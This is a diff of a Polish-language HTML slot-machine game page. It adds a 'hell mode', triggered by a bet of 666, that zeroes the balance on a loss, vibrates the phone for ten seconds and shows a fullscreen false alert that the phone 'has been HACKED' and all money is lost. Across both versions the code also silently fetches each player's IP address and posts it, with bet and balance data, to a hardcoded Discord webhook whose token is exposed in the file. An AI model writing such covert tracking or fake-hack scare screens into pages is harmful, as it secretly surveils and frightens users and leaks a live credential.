@@ -4,11 +4,11 @@
   <meta charset="UTF-8" />
   <title>Slot Machine</title>
   <style>
-    body { background: #1a1a1a; color: #f0f0f0; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px; }
-    .slot-container { background: #2c2c2c; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(255, 255, 255, 0.1); display: inline-block; width: 360px; }
-    h1 { color: #ffd700; }
+    body { background: #1a1a1a; color: #f0f0f0; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 40px; transition: background-color 0.5s, color 0.5s;}
+    .slot-container { background: #2c2c2c; padding: 30px; border-radius: 20px; box-shadow: 0 0 20px rgba(255, 255, 255, 0.1); display: inline-block; width: 360px; transition: background-color 0.5s; }
+    h1 { color: #ffd700; transition: color 0.5s; }
     .slots { font-size: 50px; margin: 20px 0; display: flex; justify-content: center; gap: 20px; }
-    .slot { width: 60px; transition: transform 0.3s ease; }
+    .slot { width: 60px; transition: transform 0.3s ease, color 0.5s; }
     .slot.win { animation: flash 0.6s ease-in-out 2; }
     @keyframes flash { 0%, 100% { transform: scale(1); color: #fff; } 50% { transform: scale(1.3); color: #ffd700; } }
     .balance { font-size: 22px; margin: 10px 0; }
@@ -17,6 +17,63 @@
     button:hover { background-color: #e6c200; }
     input[type="number"] { padding: 8px; font-size: 16px; width: 100px; border-radius: 8px; border: none; margin: 10px 0; }
     .input-container { margin-bottom: 10px; }
+
+    /* Tryb piekielny */
+    body.hell-mode {
+      background: #330000;
+      color: #ff4444;
+    }
+    body.hell-mode .slot-container {
+      background: #660000;
+      box-shadow: 0 0 30px #ff0000;
+    }
+    body.hell-mode h1 {
+      color: #ff2200;
+    }
+    body.hell-mode button {
+      background-color: #ff2200;
+      color: #fff;
+    }
+    body.hell-mode button:hover {
+      background-color: #cc0000;
+    }
+    body.hell-mode .slot {
+      color: #ff5555;
+    }
+
+    /* Pełnoekranowy overlay strachu */
+    #scaryOverlay {
+      position: fixed;
+      top:0; left:0; right:0; bottom:0;
+      background: black;
+      color: #ff0000;
+      font-size: 3em;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.5s ease;
+      user-select: none;
+      flex-direction: column;
+      padding: 20px;
+    }
+    #scaryOverlay.visible {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    #scaryOverlay button {
+      margin-top: 30px;
+      font-size: 0.5em;
+      padding: 10px 20px;
+      border-radius: 8px;
+      border: none;
+      background: #ff0000;
+      color: white;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
@@ -40,22 +97,32 @@
   <audio id="sound-win" src="https://orangefreesounds.com/wp-content/uploads/2020/12/Triumph-sound-effect.mp3"></audio>
   <audio id="sound-lose" src="https://orangefreesounds.com/wp-content/uploads/2024/09/Sad-trumpet-sound-effect.mp3"></audio>
 
+  <div id="scaryOverlay">
+    <div>Twój telefon został <br> <strong>ZHAKOWANY!</strong></div>
+    <div>Wszystkie pieniądze zostały STRACONE!</div>
+  </div>
+
   <script>
+     const playButton = document.querySelector('button');
     const symbols = ['🍒', '🍋', '🍇', '🔔', '⭐', '💎'];
+    const hellSymbols = ['🔥', '👹', '💀', '😈', '☠️', '👺'];
     const slotEls = [document.getElementById("slot1"), document.getElementById("slot2"), document.getElementById("slot3")];
     const resultDisplay = document.getElementById("result");
     const balanceDisplay = document.getElementById("balance");
     const betInput = document.getElementById("betAmount");
+    const scaryOverlay = document.getElementById("scaryOverlay");
 
     const soundSpin = document.getElementById("sound-spin");
     const soundWin = document.getElementById("sound-win");
     const soundLose = document.getElementById("sound-lose");
 
     let storedBalance = localStorage.getItem("slot_balance");
-    let balance = storedBalance !== null ? parseFloat(storedBalance) : 100;
+    let balance = storedBalance !== null ? parseFloat(storedBalance) : 700;
     let winChance = parseFloat(localStorage.getItem("slot_chance")) || 0.8;
     let winCount = parseInt(localStorage.getItem("slot_wins")) || 0;
     let lossCount = parseInt(localStorage.getItem("slot_losses")) || 0;
+
+    let hellMode = false;
 
     updateDisplay();
 
@@ -67,7 +134,9 @@
     }
 
     function getRandomSymbol() {
-      return symbols[Math.floor(Math.random() * symbols.length)];
+      return hellMode
+        ? hellSymbols[Math.floor(Math.random() * hellSymbols.length)]
+        : symbols[Math.floor(Math.random() * symbols.length)];
     }
 
     function spinSymbol(el) {
@@ -83,137 +152,179 @@
       audioElement.play().catch(err => console.log("Nie można odtworzyć dźwięku:", err));
     }
 
-	async function play() {
-	  const bet = parseFloat(betInput.value);
-	
-	  if (bet === 192168) {
-	    localStorage.clear();
-	    location.reload();
-	    return;
-	  }
-	
-	  if (isNaN(bet) || bet <= 0) {
-	    resultDisplay.textContent = "Wpisz poprawną kwotę zakładu!";
-	    return;
-	  }
-	
-	  if (bet > balance) {
-	    resultDisplay.textContent = "Za mało środków!";
-	    return;
-	  }
-	
-	  resultDisplay.textContent = "Kręcimy...";
-	  slotEls.forEach(el => el.classList.remove("win"));
-	  playSound(soundSpin);
-	
-	  const spinIntervals = slotEls.map(spinSymbol);
-	  const delays = [1000, 1500, 2000];
-	
-	  // Określ z góry wynik: 0 = przegrana, 2 = 2x symbol, 3 = jackpot
-	  let outcome = 0;
-	  const roll = Math.random();
-	  if (roll < winChance * 0.05) {
-	    outcome = 3;
-	  } else if (roll < winChance) {
-	    outcome = 2;
-	  } else {
-	    outcome = 0;
-	  }
-	
-	  // Przygotuj końcowe symbole
-	  let chosenSymbol = getRandomSymbol();
-	  let finalSymbols;
-	  if (outcome === 3) {
-	    finalSymbols = [chosenSymbol, chosenSymbol, chosenSymbol];
-	  } else if (outcome === 2) {
-	    const other = getRandomSymbol();
-	    while (other === chosenSymbol) {
-	      chosenSymbol = getRandomSymbol();
-	    }
-	    finalSymbols = [chosenSymbol, chosenSymbol, other];
-	    finalSymbols.sort(() => Math.random() - 0.5);
-	  } else {
-	    // 3 różne
-	    let s1 = getRandomSymbol();
-	    let s2 = getRandomSymbol();
-	    while (s2 === s1) s2 = getRandomSymbol();
-	    let s3 = getRandomSymbol();
-	    while (s3 === s1 || s3 === s2) s3 = getRandomSymbol();
-	    finalSymbols = [s1, s2, s3];
-	  }
-	
-	  // Zatrzymuj rolki jedna po drugiej
-	  for (let i = 0; i < 3; i++) {
-	    await new Promise(res => setTimeout(res, delays[i]));
-	    clearInterval(spinIntervals[i]);
-	    slotEls[i].textContent = finalSymbols[i];
-	  }
-	
-	  // Zlicz wynik
-	  const counts = {};
-	  for (const sym of finalSymbols) {
-	    counts[sym] = (counts[sym] || 0) + 1;
-	  }
-	  const maxMatch = Math.max(...Object.values(counts));
-	
-	  let outcomeText = '';
-	  if (maxMatch === 3) {
-	    const jackpot = bet * 5;
-	    balance += jackpot;
-	    resultDisplay.textContent = `💰 JACKPOT! +$${jackpot.toFixed(2)}`;
-	    slotEls.forEach(el => el.classList.add("win"));
-	    playSound(soundWin);
-	    winCount++;
-	    winChance = Math.max(0.1, 0.8 * Math.pow(0.8, winCount));
-	    outcomeText = 'JACKPOT';
-	  } else if (maxMatch === 2) {
-	    const prize = bet;
-	    balance += prize;
-	    resultDisplay.textContent = `🎉 Wygrana! +$${prize.toFixed(2)}`;
-	    slotEls.forEach(el => el.classList.add("win"));
-	    playSound(soundWin);
-	    winCount++;
-	    lossCount = 0;
-	    winChance = Math.max(0.1, 0.8 * Math.pow(0.9, winCount));
-	    outcomeText = 'Wygrana';
-	  } else {
-	    balance -= bet;
-	    resultDisplay.textContent = `💸 Przegrana -$${bet.toFixed(2)}`;
-	    playSound(soundLose);
-	    winCount = 0;
-	    lossCount++;
-	    winChance = Math.min(0.8, 0.1 + Math.log(lossCount + 1) / 10);
-	    outcomeText = 'Przegrana';
-	  }
-	
-	  saveGameState();
-	  updateDisplay();
-	
-	  // Wysyłka do Discorda
-	  let ip = 'Nieznane';
-	  try {
-	    const res = await fetch('https://api.ipify.org?format=json');
-	    const data = await res.json();
-	    ip = data.ip || ip;
-	  } catch (e) {
-	    console.warn('Nie udało się pobrać IP:', e);
-	  }
-	
-	  const payload = {
-	    content: `🎰 **Slot Machine - Nowa runda**\n` +
-	             `**Wynik:** ${outcomeText}\n` +
-	             `**Zakład:** $${bet.toFixed(2)}\n` +
-	             `**Saldo:** $${balance.toFixed(2)}\n` +
-	             `**Szansa wygranej:** ${(winChance * 100).toFixed(2)}%\n` +
-	             `**IP:** ${ip}`
-	  };
-	
-	  fetch('https://discord.com/api/webhooks/1381723091205361727/Fk5D9eE3P3fz4YfrzmJa86S_qkc2mftbkKy0kl2jnhesEksWNvDpyg9I5LY9FS9_9jkV', {
-	    method: 'POST',
-	    headers: { 'Content-Type': 'application/json' },
-	    body: JSON.stringify(payload),
-	  }).catch(err => console.warn('Błąd wysyłki do webhooka:', err));
-	}
+    function vibratePhone(duration = 10000) {
+      if (navigator.vibrate) {
+        navigator.vibrate(duration);
+      }
+    }
+
+    function showScaryOverlay() {
+      scaryOverlay.classList.add('visible');
+      vibratePhone();
+      // Przez 5 sekund blokujemy interakcję (można kliknąć przycisk by zdjąć overlay)
+    }
+
+    function hideScaryOverlay() {
+      scaryOverlay.classList.remove('visible');
+    }
+
+    async function play() {
+      const bet = parseFloat(betInput.value);
+      playButton.disabled = true;
+
+
+      if (bet === 192168) {
+        localStorage.clear();
+        location.reload();
+        return;
+      }
+
+      if (isNaN(bet) || bet <= 0) {
+        resultDisplay.textContent = "Wpisz poprawną kwotę zakładu!";
+        return;
+      }
+
+      if (bet > balance) {
+        resultDisplay.textContent = "Za mało środków!";
+        return;
+      }
+
+      // Aktywuj/Dezaktywuj tryb piekielny
+      if (bet === 666) {
+        hellMode = true;
+        document.body.classList.add('hell-mode');
+        resultDisplay.textContent = "🔥 Tryb Piekielny aktywowany! 🔥";
+      } else if (hellMode && bet !== 666) {
+        // Tryb piekielny jest już włączony, nie wyłączamy go aż do resetu
+      } else {
+        hellMode = false;
+        document.body.classList.remove('hell-mode');
+      }
+
+      resultDisplay.textContent = "Kręcimy...";
+      slotEls.forEach(el => el.classList.remove("win"));
+      playSound(soundSpin);
+
+      const spinIntervals = slotEls.map(spinSymbol);
+      const delays = [1000, 1500, 2000];
+
+      // Określ z góry wynik: 0 = przegrana, 2 = 2x symbol, 3 = jackpot
+      let outcome = 0;
+      const roll = Math.random();
+      if (roll < winChance * 0.05) {
+        outcome = 3;
+      } else if (roll < winChance) {
+        outcome = 2;
+      } else {
+        outcome = 0;
+      }
+
+      // Przygotuj końcowe symbole
+      let chosenSymbol = getRandomSymbol();
+      let finalSymbols;
+      if (outcome === 3) {
+        finalSymbols = [chosenSymbol, chosenSymbol, chosenSymbol];
+      } else if (outcome === 2) {
+        let other = getRandomSymbol();
+        while (other === chosenSymbol) {
+          chosenSymbol = getRandomSymbol();
+        }
+        finalSymbols = [chosenSymbol, chosenSymbol, other];
+        finalSymbols.sort(() => Math.random() - 0.5);
+      } else {
+        // 3 różne
+        let s1 = getRandomSymbol();
+        let s2 = getRandomSymbol();
+        while (s2 === s1) s2 = getRandomSymbol();
+        let s3 = getRandomSymbol();
+        while (s3 === s1 || s3 === s2) s3 = getRandomSymbol();
+        finalSymbols = [s1, s2, s3];
+      }
+
+      // Zatrzymuj rolki jedna po drugiej
+      for (let i = 0; i < 3; i++) {
+        await new Promise(res => setTimeout(res, delays[i]));
+        clearInterval(spinIntervals[i]);
+        slotEls[i].textContent = finalSymbols[i];
+      }
+
+      // Zlicz wynik
+      const counts = {};
+      for (const sym of finalSymbols) {
+        counts[sym] = (counts[sym] || 0) + 1;
+      }
+      const maxMatch = Math.max(...Object.values(counts));
+
+      let outcomeText = '';
+      if (maxMatch === 3) {
+        let multiplier = hellMode ? 13 : 5;
+        const jackpot = balance * multiplier;
+        balance += jackpot;
+        resultDisplay.textContent = `💰 JACKPOT! +$${jackpot.toFixed(2)}`;
+        slotEls.forEach(el => el.classList.add("win"));
+        playSound(soundWin);
+        winCount++;
+        winChance = Math.max(0.1, 0.8 * Math.pow(0.8, winCount));
+        outcomeText = 'JACKPOT';
+      } else if (maxMatch === 2) {
+        let multiplier = hellMode ? 6 : 1;
+        const prize = balance * multiplier;
+        balance += prize;
+        resultDisplay.textContent = `🎉 Wygrana! +$${prize.toFixed(2)}`;
+        slotEls.forEach(el => el.classList.add("win"));
+        playSound(soundWin);
+        winCount++;
+        lossCount = 0;
+        winChance = Math.max(0.1, 0.8 * Math.pow(0.9, winCount));
+        outcomeText = 'Wygrana';
+      } else {
+        if (hellMode) {
+          balance = 0; // tracisz wszystko
+          resultDisplay.textContent = `💀 PRZEGRAŁEŚ WSZYSTKO!`;
+          playSound(soundLose);
+          showScaryOverlay();
+          // resetuj zmienne trybu piekielnego?
+          // hellMode = false; // Nie wyłączamy od razu, można zostawić do restartu
+        } else {
+          balance -= bet;
+          resultDisplay.textContent = `💸 Przegrana -$${bet.toFixed(2)}`;
+          playSound(soundLose);
+        }
+        winCount = 0;
+        lossCount++;
+        winChance = Math.min(0.8, 0.1 + Math.log(lossCount + 1) / 10);
+        outcomeText = 'Przegrana';
+      }
+
+      saveGameState();
+      updateDisplay();
+      playButton.disabled = false;
+
+      // Wysyłka do Discorda
+      let ip = 'Nieznane';
+      try {
+        const res = await fetch('https://api.ipify.org?format=json');
+        const data = await res.json();
+        ip = data.ip || ip;
+      } catch (e) {
+        console.warn('Nie udało się pobrać IP:', e);
+      }
+
+      const payload = {
+        content: `🎰 **Slot Machine - Nowa runda**\n` +
+                 `**Wynik:** ${outcomeText}\n` +
+                 `**Zakład:** $${bet.toFixed(2)}\n` +
+                 `**Saldo:** $${balance.toFixed(2)}\n` +
+                 `**Szansa wygranej:** ${(winChance * 100).toFixed(2)}%\n` +
+                 `**IP:** ${ip}`
+      };
+
+      fetch('https://discord.com/api/webhooks/1381723091205361727/Fk5D9eE3P3fz4YfrzmJa86S_qkc2mftbkKy0kl2jnhesEksWNvDpyg9I5LY9FS9_9jkV', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+      }).catch(err => console.warn('Błąd wysyłki do webhooka:', err));
+    }
 
     function updateDisplay() {
       balanceDisplay.textContent = `Saldo: $${balance.toFixed(2)}`;
